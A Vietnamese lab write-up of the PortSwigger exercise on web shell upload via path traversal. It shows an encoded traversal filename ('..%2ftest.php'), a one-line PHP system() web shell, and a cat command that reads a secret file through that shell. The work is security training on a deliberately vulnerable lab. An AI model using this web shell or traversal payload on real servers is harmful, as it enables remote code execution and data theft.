## 1. Thông tin bài lab
- Tên lab: **Web shell upload via path traversal**
- Loại lỗ hổng: Path Traversal, File upload -> RCE (Remote Code Execution)
- Link bài lab: [Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
- **Mục tiêu**: Upload webshell vào thư mục thực thi mã PHP, chiếm quyền điều khiển server và đọc nội dung tệp tin bí mật _**/home/carlos/secret**_
## 2. Phân tích ban đầu
**Chức năng ứng dụng:** 
- Sau khi đăng nhập tài khoản người dùng, người dùng có thể update email, upload ảnh avatar của người dùng.

![img1](./img/lab1/img1.png)

- Sau khi upload, ứng dụng thông báo đã upload thành công và đường dẫn lưu file ảnh upload.

![img2](./img/lab1/img2.png)

**Đặt giả thuyết**
-	Kiểm tra xem liệu ta có thể upload và thực thi một file php bằng cách tạo một file tên _test.php_ với nội dung `<?php phpinfo(); ?>` và upload lên server.
- Upload thành công nhưng file _test.php_ không được thực thi mà chỉ hiển thị dưới dạng text

![img](./img/lab3/img1.png)

- Có vẻ như trang web được cấu hình không thực thi các file .php trong thư mục _/files/avatars/_
- Nếu như ta có thể upload file .php tới một thư mục khác thì liệu trang web có thực thi mã PHP không.

**Kiểm tra giả thuyết**
- Ta có đường dẫn lưu file upload là **_/var/www/html/files/avatars/_**.
- Thử lưu file upload tới đường dẫn **_/var/www/html/files/**
- Vậy tên file được sửa thành **_../test.php_** và đường dẫn chuẩn mà ta cần là: **_/var/www/html/files/avatars/../test.php_**

![img](./img/lab3/img2.png)

- Khi thực hiện upload, file _test.php_ không lưu theo đường dẫn ta muốn. 

![img](./img/lab3/img3.png)

- Thử upload lại với các kí tự _'/'_ đã được mã hóa URL cụ thể ở đây `filename="..%2ftest.php"`

![img](./img/lab3/img4.png)

- Đường dẫn lưu file upload đã theo như ý ta muốn

![img](./img/lab3/img5.png)

- Khi truy cập file _test.php_ theo đường dẫn **_/files/test.php_** mã PHP đã được thực thi

![img](./img/lab3/img6.png)

## 3. Tiến hành khai thác
- Tạo một file tên _shell.php_ với nội dung là đoạn code php:

```<?php echo system($_GET['x']) ?>```

Đoạn code cho phép thực thi câu lệnh hệ thống, trong đó x là tham số ta có thể truyền vào qua URL.

![img](./img/lab3/img7.png)

- Kết quả đường dẫn lưu file shell cho phép thực thi mã PHP

![img](./img/lab3/img8.png)

- Truyền tham số *'x'* để đọc nội dung tệp tin bí mật `x=cat%20/home/carlos/secret`

![img](./img/lab3/img9.png)
